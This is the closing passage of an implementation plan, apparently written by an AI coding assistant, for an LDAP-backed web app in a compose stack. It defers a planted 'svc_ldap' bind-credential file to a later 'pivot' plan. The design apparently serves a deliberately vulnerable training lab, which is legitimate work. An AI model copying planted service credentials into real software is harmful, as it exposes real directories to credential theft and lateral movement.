- `svc_ldap` bind-credential config discovery (§5 "the real path") → intentionally **not yet implemented**: this plan's compose stack uses `LDAP_MODE=mock` with no bind-credential file to discover, because there's no real DC to bind to until Plan 3. Task 9 documents this boundary explicitly. Plan 2 (network/pivot) is the right place to add the `.env`/`ldap.conf` artifact once there's a real DC on the other end of the pivot for it to be useful — adding it here would be an untestable, unverifiable file.

**Placeholder scan:** No TBD/TODO markers; every step has complete code and exact commands. The one deliberately deferred piece (bind-credential file) is called out above with a reason, not left vague.

**Type consistency:** `authenticate()` returns `(bool, list)` everywhere it's used (Tasks 3, 6, 7). `sanitize()` is `str -> str` throughout. `ldap_connection_factory` is always a zero-arg callable returning an `ldap3.Connection`, consistent across `webapp.py`, `wsgi.py`, and all tests.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-08-24-donerup-web-app.md`. Two execution options:

1. **Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration
2. **Inline Execution** — Execute tasks in this session using executing-plans, batch execution with checkpoints

Which approach?
